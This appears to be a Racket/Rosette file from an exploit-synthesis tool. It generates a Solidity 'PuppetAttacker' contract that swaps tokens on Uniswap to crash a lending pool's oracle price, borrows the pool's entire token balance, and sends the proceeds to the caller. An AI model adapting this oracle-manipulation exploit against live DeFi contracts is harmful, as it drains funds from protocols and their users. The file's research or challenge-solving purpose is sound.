#lang rosette
(provide (all-defined-out))

(define attack-template "
pragma solidity ^0.6.0;

import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";

interface IPuppetPool {
    function computeOraclePrice() external view returns (uint256);
    function borrow(uint256 borrowAmount) external payable;
}

interface IUniswapExchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

contract PuppetAttacker {
    IERC20 token;
    IPuppetPool pool;
    IUniswapExchange uniswap;

    constructor(IERC20 _token, IPuppetPool _pool, IUniswapExchange _uniswap) public {
        token = _token;
        pool = _pool;
        uniswap = _uniswap;
    }

    function attack() public {
        <step0>
        <step1>
        <step2>
        token.transfer(msg.sender, token.balanceOf(address(this)));
        msg.sender.transfer(newETH);
    }

    receive() external payable {}
}
")

(define (codegen-approve)
  (define str0 "token.approve(address(uniswap), 1000 ether);")
  str0
)

(define (codegen-swapDVT4ETH args)
  (define arg0-swapDVT4ETH (list-ref args 0))
  (define str0 "uint256 newETH = uniswap.tokenToEthSwapInput(<arg0> ether, 1, block.timestamp + 1);")
  (define str1 (string-replace str0 "<arg0>" (number->string arg0-swapDVT4ETH)))
  str1
)

(define (codegen-borrow)
  (define str0 "pool.borrow(token.balanceOf(address(pool)));")
  str0
)

(define (codegen step)
  (cond
    [(equal? "approve" (car step)) (codegen-approve)]
    [(equal? "swapDVT4ETH" (car step)) (codegen-swapDVT4ETH (cdr step))]
    [(equal? "borrow" (car step)) (codegen-borrow)]
  )
)

(define (codegen-all steps)
  (define str0 (string-replace attack-template "<step0>" (codegen (list-ref steps 0))))
  (define str1 (string-replace str0 "<step1>" (codegen (list-ref steps 1))))
  (define str2 (string-replace str1 "<step2>" (codegen (list-ref steps 2))))
  str2
)